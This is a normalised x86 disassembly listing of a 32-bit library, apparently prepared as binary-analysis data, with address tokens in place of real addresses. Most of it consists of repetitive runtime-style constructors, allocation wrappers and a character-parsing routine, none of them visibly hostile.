lea eax [ ebp - 0x1c ]
push eax
call sub_1000762b
mov ecx [ eax ]
lea ebx [ esi + 0x2c ]
mov [ ebx ] ecx
mov eax [ eax + 0x4 ]
mov [ ebx + 0x4 ] eax
call sub_100208a9
mov edi eax
xor eax eax
push ebx
push eax
mov [ esi + 0x8 ] eax
mov [ esi + 0x10 ] eax
mov [ esi + 0x14 ] eax
mov [ esi + 0x18 ] eax
push [ edi + 0x1c ]
mov [ ebp - 0x4 ] eax
call sub_10006a1a
add esp 0xc
cmp [ esi + 0x28 ] 0x0
mov [ esi + 0x8 ] eax
je r-xdata
mov eax [ edi + 0x10 ]
mov eax [ edi + 0xc ]
jmp r-xdata
push ebx
push 0x0
push eax
call sub_10006a1a
mov [ esi + 0x14 ] eax
add esp 0xc
cmp [ edi + 0x2f ] 0x4
mov eax r--data
ja r-xdata
mov eax [ edi + 0x20 ]
push ebx
push 0x0
push eax
call sub_10006a1a
mov [ esi + 0x10 ] eax
add esp 0xc
cmp [ edi + 0x2e ] 0x4
mov eax r--data
ja r-xdata
push ebx
push 0x0
push eax
call sub_10006a1a
mov [ esi + 0x18 ] eax
mov eax [ edi + 0x14 ]
mov al [ eax ]
mov [ esi + 0xc ] al
mov eax [ edi + 0x18 ]
mov al [ eax ]
add esp 0xc
cmp [ esi + 0x28 ] 0x0
mov [ esi + 0xd ] al
je r-xdata
mov eax [ edi + 0x24 ]
mov al [ edi + 0x29 ]
mov al [ edi + 0x28 ]
jmp r-xdata
and [ esi + 0x1c ] 0x0
cmp eax 0x7f
jl r-xdata
movsx eax al
mov [ esi + 0x1c ] eax
test eax eax
jl r-xdata
call sub_10023f0b
retn 0x8
push 0x4
mov esi r--data
push esi
push ebx
call sub_10026940
push 0x4
push esi
push [ ebp + 0x8 ]
call sub_10026940
add esp 0x18
movsx eax [ edi + 0x2e ]
push eax
movsx eax [ edi + 0x2a ]
push eax
movsx eax [ edi + 0x2b ]
push eax
lea ebx [ esi + 0x20 ]
push ebx
mov ecx esi
call sub_1003a5cd
movsx ecx [ edi + 0x2f ]
push ecx
movsx ecx [ edi + 0x2c ]
push ecx
movsx ecx [ edi + 0x2d ]
lea eax [ esi + 0x24 ]
push ecx
push eax
mov ecx esi
mov [ ebp + 0x8 ] eax
call sub_1003a5cd
cmp [ ebp + 0xc ] 0x0
je r-xdata
sub_10044486
push 0x4
mov eax sub_100488b7
call sub_10023e33
mov esi ecx
mov [ ebp - 0x10 ] esi
mov eax [ ebp + 0xc ]
mov [ esi + 0x4 ] eax
push [ ebp + 0x14 ]
mov al [ ebp + 0x10 ]
push [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
mov [ esi ] r--data
mov [ esi + 0x28 ] al
call sub_10044339
mov eax esi
call sub_10023f0b
retn 0x10
sub_100444c2
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ecx ]
mov [ ebp - 0x8 ] eax
mov eax [ ecx + 0x4 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
neg eax
push eax
lea ecx [ ebp - 0x8 ]
call sub_1003b4af
mov ecx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x4 ] ecx
leave
retn 0x8
sub_100444f4
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x10 ]
mov esi ecx
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10044486
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0xc
sub_10044519
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_10044231
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_1002004f
pop ecx
sub_10044540
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x10 ]
mov esi ecx
push 0x1
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10044486
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0xc
sub_10044565
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_10044231
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_1002004f
pop ecx
sub_100445c1
push 0x40
mov eax sub_10048553
call sub_10023e9c
mov eax [ ebp + 0x8 ]
mov esi r--data
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x44 ] eax
mov eax [ ebp + 0x1c ]
mov ebx ecx
lea ecx [ ebp - 0x34 ]
mov [ ebp - 0x38 ] eax
movsb [ edi ] [ esi ]
call sub_10007ee2
mov al [ ebp + 0x24 ]
and [ ebp - 0x4 ] 0x0
test al al
jne r-xdata
mov [ ebp - 0x16 ] al
mov al [ ebp + 0x20 ]
mov [ ebp - 0x15 ] al
mov al [ ebp + 0x20 ]
mov [ ebp - 0x16 ] al
jmp r-xdata
push 0x0
push esi
lea ecx [ ebp - 0x34 ]
call sub_10005af7
mov eax [ ebp - 0x20 ]
mov edi [ ebx + 0x8 ]
mov [ ebp - 0x3c ] eax
lea eax [ ebp - 0x4c ]
push eax
lea ecx [ ebp - 0x34 ]
call sub_10007e4e
mov ecx eax
call sub_10006a85
push edi
push [ ebp - 0x38 ]
lea ecx [ ebp - 0x18 ]
push ecx
push [ ebp - 0x3c ]
push eax
call sub_1002f5a7
mov edi eax
add esp 0x14
test edi edi
jbe r-xdata
push 0x10
pop esi
jmp r-xdata
add esi esi
lea eax [ ebp - 0x4c ]
push eax
lea ecx [ ebp - 0x34 ]
call sub_10007e4e
mov ecx [ eax ]
mov [ ebp - 0x40 ] ecx
mov eax [ eax + 0x4 ]
mov [ ebp - 0x3c ] eax
jmp r-xdata
dec edi
jne r-xdata
lea ecx [ ebp - 0x40 ]
call sub_10006abc
mov ecx eax
call sub_10006a85
mov al [ eax ]
mov [ ebp - 0x38 ] al
push [ ebp - 0x38 ]
lea ecx [ ebp + 0xc ]
call sub_10037ec1
mov eax [ ebp + 0xc ]
mov esi [ ebp - 0x44 ]
mov [ esi ] eax
mov eax [ ebp + 0x10 ]
push edi
push 0x1
lea ecx [ ebp - 0x34 ]
mov [ esi + 0x4 ] eax
call sub_100023ce
mov eax esi
call sub_10023f1f
retn 0x20
sub_100446af
push 0x94
mov eax sub_10047a42
call sub_10023e33
xor edi edi
xor ebx ebx
mov [ ebp - 0x10 ] edi
mov esi [ ebp + 0x8 ]
inc ebx
cmp esi edi
je r-xdata
mov eax ebx
call sub_10023f0b
retn
cmp [ esi ] edi
jne r-xdata
push 0x10
call sub_10020186
pop ecx
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x4 ] edi
cmp eax edi
je r-xdata
xor eax eax
mov ecx [ ebp + 0xc ]
lea eax [ ebp - 0x2c ]
push eax
call sub_100076e4
push eax
lea ecx [ ebp - 0xa0 ]
mov [ ebp - 0x4 ] bl
mov [ ebp - 0x10 ] ebx
call sub_1000768f
mov ecx [ ebp + 0x8 ]
push edi
push eax
mov [ ebp - 0x10 ] 0x3
call sub_10044186
jmp r-xdata
test [ ebp - 0x10 ] bl
je r-xdata
and [ ebp - 0x10 ] 0xfffffffd
lea ecx [ ebp - 0xa0 ]
call sub_10007701
push 0x2
pop ecx
mov [ ebp - 0x4 ] ecx
mov [ esi ] eax
test [ ebp - 0x10 ] cl
je r-xdata
push edi
push ebx
lea ecx [ ebp - 0x2c ]
call sub_100023ce
sub_10044749
push 0x24
mov eax sub_10048591
call sub_10023e33
mov esi [ ebp + 0x8 ]
mov edi [ ebp + 0xc ]
mov ebx [ ebp + 0x10 ]
and [ ebp - 0x1c ] 0x0
mov [ ebp - 0x10 ] ecx
mov ecx esi
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x14 ] edi
mov [ ebp - 0x18 ] ebx
call sub_10007ee2
and [ ebp - 0x4 ] 0x0
mov eax ebx
sub eax edi
mov [ ebp - 0x1c ] 0x1
je r-xdata
push 0x0
push eax
mov ecx esi
call sub_1000c375
mov eax esi
call sub_10023f0b
retn 0xc
mov ecx [ ebp - 0x10 ]
add ecx 0x8
mov [ ebp - 0x10 ] ecx
test eax eax
ja r-xdata
push 0x0
push eax
mov ecx esi
call sub_1000c375
lea eax [ ebp - 0x28 ]
push eax
mov ecx esi
call sub_10007e4e
mov ecx eax
call sub_10006a85
mov edi [ esi + 0x14 ]
mov ebx eax
lea eax [ ebp - 0x30 ]
push eax
mov ecx esi
call sub_10007e4e
mov ecx eax
call sub_10006a85
push [ ebp - 0x10 ]
add edi ebx
push [ ebp - 0x18 ]
push [ ebp - 0x14 ]
push edi
push eax
call sub_10046f96
add esp 0x14
cmp eax [ esi + 0x14 ]
jbe r-xdata
sub_100447f4
push 0x94
mov eax sub_10047a42
call sub_10023e33
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov edi [ ebp + 0x8 ]
cmp edi ebx
je r-xdata
push 0x6
pop eax
call sub_10023f0b
retn
cmp [ edi ] ebx
jne r-xdata
push 0x8
call sub_10020186
mov esi eax
pop ecx
mov [ ebp + 0x8 ] esi
mov [ ebp - 0x4 ] ebx
inc ebx
test esi esi
je r-xdata
xor esi esi
mov ecx [ ebp + 0xc ]
lea eax [ ebp - 0x2c ]
push eax
call sub_100076e4
push eax
lea ecx [ ebp - 0xa0 ]
mov [ ebp - 0x4 ] bl
mov [ ebp - 0x10 ] ebx
call sub_1000768f
and [ esi + 0x4 ] 0x0
mov [ ebp - 0x10 ] 0x3
mov [ esi ] r--data
jmp r-xdata
test [ ebp - 0x10 ] bl
je r-xdata
and [ ebp - 0x10 ] 0xfffffffd
lea ecx [ ebp - 0xa0 ]
call sub_10007701
push 0x2
pop eax
mov [ ebp - 0x4 ] eax
mov [ edi ] esi
test [ ebp - 0x10 ] al
je r-xdata
push 0x0
push ebx
lea ecx [ ebp - 0x2c ]
call sub_100023ce
sub_10044890
push 0x94
mov eax sub_10047a42
call sub_10023e33
xor edi edi
mov [ ebp - 0x10 ] edi
mov esi [ ebp + 0x8 ]
cmp esi edi
je r-xdata
push 0x3
pop eax
call sub_10023f0b
retn
cmp [ esi ] edi
jne r-xdata
push 0x10
call sub_10020186
pop ecx
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x4 ] edi
cmp eax edi
je r-xdata
xor eax eax
mov ecx [ ebp + 0xc ]
lea eax [ ebp - 0x2c ]
push eax
call sub_100076e4
push eax
lea ecx [ ebp - 0xa0 ]
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x10 ] 0x1
call sub_1000768f
mov ecx [ ebp + 0x8 ]
push edi
push eax
mov [ ebp - 0x10 ] 0x3
call sub_100441eb
jmp r-xdata
test [ ebp - 0x10 ] 0x1
je r-xdata
and [ ebp - 0x10 ] 0xfffffffd
lea ecx [ ebp - 0xa0 ]
call sub_10007701
push 0x2
pop ecx
mov [ ebp - 0x4 ] ecx
mov [ esi ] eax
test [ ebp - 0x10 ] cl
je r-xdata
push edi
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_100023ce
sub_1004492f
push 0x94
mov eax sub_10047a42
call sub_10023e33
xor edi edi
mov [ ebp - 0x10 ] edi
mov esi [ ebp + 0x8 ]
cmp esi edi
je r-xdata
push 0x3
pop eax
call sub_10023f0b
retn
cmp [ esi ] edi
jne r-xdata
push 0x10
call sub_10020186
pop ecx
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x4 ] edi
cmp eax edi
je r-xdata
xor eax eax
mov ecx [ ebp + 0xc ]
lea eax [ ebp - 0x2c ]
push eax
call sub_100076e4
push eax
lea ecx [ ebp - 0xa0 ]
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x10 ] 0x1
call sub_1000768f
mov ecx [ ebp + 0x8 ]
push edi
push eax
mov [ ebp - 0x10 ] 0x3
call sub_1004420e
jmp r-xdata
test [ ebp - 0x10 ] 0x1
je r-xdata
and [ ebp - 0x10 ] 0xfffffffd
lea ecx [ ebp - 0xa0 ]
call sub_10007701
push 0x2
pop ecx
mov [ ebp - 0x4 ] ecx
mov [ esi ] eax
test [ ebp - 0x10 ] cl
je r-xdata
push edi
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_100023ce
sub_100449ce
push 0x94
mov eax sub_10047e00
call sub_10023e33
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov edi [ ebp + 0x8 ]
push 0x3
pop esi
cmp edi ebx
je r-xdata
mov eax esi
call sub_10023f0b
retn
cmp [ edi ] ebx
jne r-xdata
push 0x34
call sub_10020186
pop ecx
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x4 ] ebx
inc ebx
test eax eax
je r-xdata
xor eax eax
mov ecx [ ebp + 0xc ]
lea eax [ ebp - 0x2c ]
push eax
call sub_100076e4
push eax
lea ecx [ ebp - 0xa0 ]
mov [ ebp - 0x4 ] bl
mov [ ebp - 0x10 ] ebx
call sub_1000768f
mov ecx [ ebp + 0x8 ]
push ebx
push 0x0
push eax
mov [ ebp - 0x4 ] 0x2
mov [ ebp - 0x10 ] esi
call sub_100444f4
jmp r-xdata
test [ ebp - 0x10 ] bl
je r-xdata
and [ ebp - 0x10 ] 0xfffffffd
lea ecx [ ebp - 0xa0 ]
call sub_10007701
test [ ebp - 0x10 ] 0x2
mov [ edi ] eax
mov [ ebp - 0x4 ] esi
je r-xdata
push 0x0
push ebx
lea ecx [ ebp - 0x2c ]
call sub_100023ce
sub_10044add
push 0x94
mov eax sub_10047e00
call sub_10023e33
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov edi [ ebp + 0x8 ]
push 0x3
pop esi
cmp edi ebx
je r-xdata
mov eax esi
call sub_10023f0b
retn
cmp [ edi ] ebx
jne r-xdata
push 0x34
call sub_10020186
pop ecx
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x4 ] ebx
inc ebx
test eax eax
je r-xdata
xor eax eax
mov ecx [ ebp + 0xc ]
lea eax [ ebp - 0x2c ]
push eax
call sub_100076e4
push eax
lea ecx [ ebp - 0xa0 ]
mov [ ebp - 0x4 ] bl
mov [ ebp - 0x10 ] ebx
call sub_1000768f
mov ecx [ ebp + 0x8 ]
push ebx
push 0x0
push eax
mov [ ebp - 0x4 ] 0x2
mov [ ebp - 0x10 ] esi
call sub_10044540
jmp r-xdata
test [ ebp - 0x10 ] bl
je r-xdata
and [ ebp - 0x10 ] 0xfffffffd
lea ecx [ ebp - 0xa0 ]
call sub_10007701
test [ ebp - 0x10 ] 0x2
mov [ edi ] eax
mov [ ebp - 0x4 ] esi
je r-xdata
push 0x0
push ebx
lea ecx [ ebp - 0x2c ]
call sub_100023ce
sub_10044b7c
push 0x94
mov eax sub_10047a42
call sub_10023e33
xor edi edi
mov [ ebp - 0x10 ] edi
mov esi [ ebp + 0x8 ]
cmp esi edi
je r-xdata
push 0x5
pop eax
call sub_10023f0b
retn
cmp [ esi ] edi
jne r-xdata
push 0x14
call sub_10020186
pop ecx
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x4 ] edi
cmp eax edi
je r-xdata
xor eax eax
mov ecx [ ebp + 0xc ]
lea eax [ ebp - 0x2c ]
push eax
call sub_100076e4
push eax
lea ecx [ ebp - 0xa0 ]
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x10 ] 0x1
call sub_1000768f
mov ecx [ ebp + 0x8 ]
push edi
push eax
mov [ ebp - 0x10 ] 0x3
call sub_1004424d
jmp r-xdata
test [ ebp - 0x10 ] 0x1
je r-xdata
and [ ebp - 0x10 ] 0xfffffffd
lea ecx [ ebp - 0xa0 ]
call sub_10007701
push 0x2
pop ecx
mov [ ebp - 0x4 ] ecx
mov [ esi ] eax
test [ ebp - 0x10 ] cl
je r-xdata
push edi
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_100023ce
sub_10044c1b
push 0x14
mov eax sub_10047e26
call sub_10023e33
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_1001b1bf
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10007328
mov ecx [ ebp + 0x8 ]
push eax
call sub_1000735d
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_1001b1e7
mov eax edi
call sub_10023f0b
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_100446af
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10007ac8
push edi
call sub_1001b3bc
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100202ec
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10023a01
sub_10044cb8
push 0x14
mov eax sub_10047e26
call sub_10023e33
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_1001b1bf
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10007328
mov ecx [ ebp + 0x8 ]
push eax
call sub_1000735d
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_1001b1e7
mov eax edi
call sub_10023f0b
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_100447f4
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10007ac8
push edi
call sub_1001b3bc
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100202ec
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10023a01
sub_10044d55
push 0x14
mov eax sub_10047e26
call sub_10023e33
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_1001b1bf
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10007328
mov ecx [ ebp + 0x8 ]
push eax
call sub_1000735d
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_1001b1e7
mov eax edi
call sub_10023f0b
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_10044890
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10007ac8
push edi
call sub_1001b3bc
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100202ec
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10023a01
sub_10044df2
push 0x14
mov eax sub_10047e26
call sub_10023e33
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_1001b1bf
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10007328
mov ecx [ ebp + 0x8 ]
push eax
call sub_1000735d
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_1001b1e7
mov eax edi
call sub_10023f0b
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_1004492f
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10007ac8
push edi
call sub_1001b3bc
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100202ec
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10023a01
sub_10044e8f
push 0x14
mov eax sub_10047e26
call sub_10023e33
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_1001b1bf
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10007328
mov ecx [ ebp + 0x8 ]
push eax
call sub_1000735d
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_1001b1e7
mov eax edi
call sub_10023f0b
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_100449ce
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10007ac8
push edi
call sub_1001b3bc
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100202ec
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10023a01
sub_10044f2c
push 0x14
mov eax sub_10047e26
call sub_10023e33
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_1001b1bf
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10007328
mov ecx [ ebp + 0x8 ]
push eax
call sub_1000735d
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_1001b1e7
mov eax edi
call sub_10023f0b
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_10044add
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10007ac8
push edi
call sub_1001b3bc
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100202ec
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10023a01
sub_10044fc9
push 0x14
mov eax sub_10047e26
call sub_10023e33
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_1001b1bf
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10007328
mov ecx [ ebp + 0x8 ]
push eax
call sub_1000735d
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_1001b1e7
mov eax edi
call sub_10023f0b
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_10044b7c
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10007ac8
push edi
call sub_1001b3bc
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100202ec
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10023a01
sub_10045066
push 0x170
mov eax sub_1004868c
call sub_10023e9c
mov eax [ ebp + 0x10 ]
mov esi [ ebp + 0x8 ]
mov ebx [ ebp + 0xc ]
and [ ebp - 0x6c ] 0x0
cmp [ ebp + 0x14 ] 0x0
mov [ ebp - 0x74 ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x7c ] esi
mov [ ebp - 0x94 ] ebx
mov [ ebp - 0x84 ] eax
mov ecx eax
je r-xdata
lea eax [ ebp - 0xbc ]
push eax
call sub_10007b59
push eax
mov [ ebp - 0x4 ] 0x2
call sub_10044e8f
pop ecx
mov edi eax
mov [ ebp - 0x90 ] eax
lea ecx [ ebp - 0xbc ]
lea eax [ ebp - 0xb8 ]
push eax
call sub_10007b59
push eax
mov [ ebp - 0x4 ] 0x1
call sub_10044f2c
mov edi eax
pop ecx
mov [ ebp - 0x90 ] edi
lea ecx [ ebp - 0xb8 ]
jmp r-xdata
mov ecx [ ebp - 0x98 ]
cmp ecx 0x4
jae r-xdata
call sub_10007b41
lea ecx [ ebp - 0x64 ]
mov [ ebp - 0x65 ] 0x0
mov [ ebp - 0x75 ] 0x0
call sub_10007ee2
mov ecx esi
mov [ ebp - 0x4 ] 0x3
call sub_10007ee2
mov eax [ edi ]
lea ecx [ ebp - 0xb4 ]
push ecx
mov ecx edi
mov [ ebp - 0x6c ] 0x1
call [ eax + 0x24 ]
and [ ebp - 0x98 ] 0x0
jmp r-xdata
cmp [ ebp - 0x65 ] 0x0
jne r-xdata
movsx eax [ ebp + ecx - 0xb4 ]
sub eax 0x20
je r-xdata
mov ecx [ ebp - 0x7c ]
push 0xffffffff
push 0x0
call sub_10002143
jmp r-xdata
cmp [ ebp - 0x50 ] 0x1
jbe r-xdata
cmp ecx 0x3
je r-xdata
sub eax 0x4
je r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x64 ]
call sub_100023ce
mov eax [ ebp - 0x7c ]
call sub_10023f1f
retn 0x14
cmp [ ebp - 0x75 ] 0x0
je r-xdata
and [ ebp - 0x8c ] 0x0
and [ ebp - 0x88 ] 0x0
lea eax [ ebp - 0xc4 ]
push eax
lea ecx [ ebp - 0x64 ]
call sub_10007e4e
mov ecx [ eax ]
mov [ ebp - 0x8c ] ecx
mov eax [ eax + 0x4 ]
mov [ ebp - 0x88 ] eax
jmp r-xdata
inc [ ebp - 0x98 ]
cmp [ ebp - 0x65 ] 0x0
mov ebx [ ebp - 0x94 ]
je r-xdata
mov ecx [ ebp - 0x84 ]
lea eax [ ebp - 0x88 ]
push eax
call sub_10007b59
push eax
mov [ ebp - 0x4 ] 0xd
call sub_1000d625
pop ecx
lea ecx [ ebp - 0x88 ]
mov esi eax
mov [ ebp - 0x4 ] 0x3
call sub_10007b41
jmp r-xdata
lea eax [ ebp - 0x2c ]
push eax
mov ecx edi
call sub_1003c0be
mov eax [ ebp - 0x84 ]
test [ eax + 0x10 ] 0x8
mov [ ebp - 0x4 ] 0x4
jne r-xdata
sub eax 0x7
je r-xdata
mov ecx [ ebp - 0x7c ]
push 0x2d
push 0x1
push 0x0
call sub_10005b45
lea eax [ ebp - 0xa0 ]
push eax
lea ecx [ ebp - 0x64 ]
call sub_10007ebd
push eax
lea ecx [ ebp - 0x8c ]
call sub_10006abc
mov ecx eax
call sub_10006a70
test al al
jne r-xdata
mov edi [ ebp - 0x90 ]
push [ ebp - 0x74 ]
push ebx
call sub_10038079
pop ecx
pop ecx
test al al
jne r-xdata
cmp [ ebp - 0x98 ] 0x3
jne r-xdata
cmp [ ebp - 0x14 ] 0x10
mov esi [ ebp - 0x28 ]
jae r-xdata
push [ ebp - 0x74 ]
mov ecx ebx
call sub_10037f31
test al al
jne r-xdata
sub eax 0x4b
je r-xdata
push [ ebp - 0x74 ]
push ebx
call sub_10038079
pop ecx
pop ecx
test al al
je r-xdata
lea eax [ ebp - 0xc4 ]
push eax
lea ecx [ ebp - 0x64 ]
call sub_10007ebd
push eax
lea ecx [ ebp - 0x8c ]
call sub_10006a70
test al al
je r-xdata
mov ecx ebx
call sub_10038064
mov ecx [ esi + 0x10 ]
movzx eax al
test [ ecx + eax * 2 ] 0x48
je r-xdata
lea eax [ ebp - 0xd4 ]
push eax
lea ecx [ ebp - 0x2c ]
call sub_10007e4e
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0xa0 ] ecx
mov [ ebp - 0x9c ] eax
jmp r-xdata
cmp [ ebp - 0x50 ] 0x1
ja r-xdata
mov ecx ebx
call sub_10038064
cmp al [ esi ]
jne r-xdata
lea esi [ ebp - 0x28 ]
lea eax [ ebp - 0x128 ]
push eax
mov ecx edi
call sub_1003c182
or [ ebp - 0x6c ] 0x2
cmp [ eax + 0x14 ] 0x0
mov [ ebp - 0x4 ] 0x5
jbe r-xdata
mov eax [ edi ]
xor esi esi
mov ecx edi
mov [ ebp - 0x80 ] esi
call [ eax + 0x1c ]
mov [ ebp - 0xa4 ] eax
lea eax [ ebp - 0x48 ]
push eax
mov ecx edi
call sub_1004458c
mov [ ebp - 0x4 ] 0xb
cmp [ ebp - 0x34 ] esi
je r-xdata
dec eax
dec eax
jne r-xdata
lea ecx [ ebp - 0x8c ]
call sub_10006a85
mov ecx ebx
mov esi eax
call sub_10038064
cmp al [ esi ]
jne r-xdata
mov ecx ebx
call sub_10037ee7
push [ ebp - 0x74 ]
push ebx
call sub_10038079
pop ecx
pop ecx
test al al
jne r-xdata
push [ ebp - 0x74 ]
mov ecx ebx
call sub_10037f31
test al al
jne r-xdata
push 0xffffffff
push 0x0
lea ecx [ ebp - 0x2c ]
call sub_10002143
mov [ ebp - 0x6d ] 0x0
lea eax [ ebp - 0xf0 ]
push eax
mov ecx edi
call sub_1003c182
or [ ebp - 0x6c ] 0x4
push 0x0
mov ecx eax
mov [ ebp - 0x4 ] 0x6
call sub_10005bdf
mov ecx ebx
mov esi eax
call sub_10038064
mov [ ebp - 0x6d ] 0x1
cmp [ esi ] al
je r-xdata
push [ ebp - 0x74 ]
push ebx
call sub_10038079
pop ecx
pop ecx
test al al
jne r-xdata
mov eax [ edi ]
mov ecx edi
call [ eax + 0x8 ]
mov [ ebp - 0x6d ] al
test al al
je r-xdata
mov ecx ebx
call sub_10037ee7
lea eax [ ebp - 0xcc ]
push eax
lea ecx [ ebp - 0x2c ]
call sub_10007ebd
push eax
lea ecx [ ebp - 0xa0 ]
call sub_10006a70
test al al
je r-xdata
lea eax [ ebp - 0xc4 ]
push eax
lea ecx [ ebp - 0x2c ]
call sub_10007ebd
push eax
lea ecx [ ebp - 0xa0 ]
call sub_10006a70
test al al
je r-xdata
cmp [ ebp - 0x14 ] 0x10
mov esi [ ebp - 0x28 ]
jae r-xdata
test [ ebp - 0x6c ] 0x2
